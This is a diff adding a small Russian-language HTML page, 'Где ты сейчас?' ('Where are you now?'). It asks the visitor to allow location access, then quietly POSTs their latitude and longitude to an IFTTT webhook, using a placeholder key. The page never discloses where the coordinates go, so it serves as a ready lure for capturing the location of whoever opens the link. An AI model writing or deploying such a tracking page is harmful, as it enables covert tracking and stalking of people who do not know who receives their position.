@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Где ты сейчас?</title>
+</head>
+<body>
+  <h1>Проверка местоположения</h1>
+  <p>Нажми "Разрешить", чтобы поделиться координатами</p>
+  <script>
+    function sendLocation(lat, lon) {
+      fetch("https://maker.ifttt.com/trigger/location_event/with/key/ТВОЙ_КЛЮЧ", {
+        method: "POST",
+        body: JSON.stringify({ value1: lat, value2: lon }),
+        headers: { "Content-Type": "application/json" }
+      });
+    }
+
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        position => {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+          alert("Спасибо! Координаты получены.");
+          sendLocation(lat, lon);
+        },
+        error => {
+          alert("Не удалось получить координаты.");
+        }
+      );
+    } else {
+      alert("Геолокация не поддерживается.");
+    }
+  </script>
+</body>
+</html>
